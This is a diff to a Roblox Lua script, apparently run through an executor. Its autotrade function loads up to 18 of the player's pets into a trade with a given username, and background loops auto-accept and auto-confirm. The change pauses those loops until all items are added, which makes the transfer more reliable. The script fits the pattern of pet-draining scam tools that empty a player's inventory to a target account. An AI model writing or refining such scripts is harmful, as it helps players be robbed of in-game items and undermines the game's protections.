@@ -51,6 +51,7 @@ local Data = require(ReplicatedStorage.ClientModules.Core.ClientData)
 -- ============== STATE ==============
 local pets_unique_ids      = {}
 local trade_status         = false
+local adding_items         = false  -- blocks auto-accept while adding items
 
 -- ============== PRINT HEADER ==============
 print("===========================================")
@@ -195,6 +196,7 @@ local function setup_auto_negotiate()
     task.spawn(function()
         while task.wait(0.5) do
             pcall(function()
+                if adding_items then return end  -- dont accept while adding items
                 local tradeGui = LocalPlayer.PlayerGui:FindFirstChild("TradeApp")
                 if tradeGui and tradeGui.Frame.Visible then
                     first_trade_accept()
@@ -208,6 +210,7 @@ local function setup_auto_confirm()
     task.spawn(function()
         while task.wait(0.5) do
             pcall(function()
+                if adding_items then return end  -- dont confirm while adding items
                 local tradeGui = LocalPlayer.PlayerGui:FindFirstChild("TradeApp")
                 if tradeGui and tradeGui.Frame.Visible then
                     confirm_trade()
@@ -313,22 +316,34 @@ local function autotrade(username)
 
         task.wait(1)
 
+        -- Lock auto-systems while adding items
+        adding_items = true
+        print("Adding items (auto-accept paused)...")
+
         -- Add pets (max 18)
         local added = 0
         for _, uid in ipairs(pets_unique_ids) do
             if added >= 18 then break end
-            add_item_to_trade(uid); added = added + 1; task.wait(0.3)
+            add_item_to_trade(uid)
+            added = added + 1
+            task.wait(0.5)  -- slightly longer per item to ensure server registers
         end
 
-        print(string.format("✅ Added %d item(s) to trade", added))
+        print(string.format("Added %d item(s) — waiting for trade to update...", added))
+        task.wait(3)  -- extra wait after all items added
+
+        -- Unlock auto-systems
+        adding_items = false
+
+        -- Manually accept
+        print("Accepting trade...")
+        first_trade_accept()
         task.wait(2)
 
-        -- Wait countdown + accept
-        print("Waiting 6s countdown...")
+        -- Wait for countdown then confirm
+        print("Waiting for countdown...")
         task.wait(6)
-        print("Accepting...")
-        first_trade_accept()
-        task.wait(1)
+        print("Confirming...")
         confirm_trade()
 
         -- Wait for trade to close
